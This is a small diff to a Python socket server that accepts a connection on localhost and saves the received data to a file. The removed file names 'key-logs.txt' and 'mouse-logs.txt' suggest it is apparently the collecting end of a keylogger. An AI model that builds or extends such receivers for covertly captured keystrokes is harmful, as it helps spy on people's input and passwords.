@@ -1,7 +1,6 @@
 import socket
-import sys
 
-files = ['key-logs.txt', 'mouse-logs.txt']
+file_count = 2
 
 s = socket.socket()
 s.bind(("localhost",9999))  # edit hostname and port here
@@ -14,7 +13,7 @@ while True:
     print('Got connection from: ',address)
     
     f = open('server-copy.txt','wb') # open in binary    
-    for i in range(len(files)):
+    for i in range(file_count):
         l = sc.recv(1024)
         f.write(l)    
     f.close()
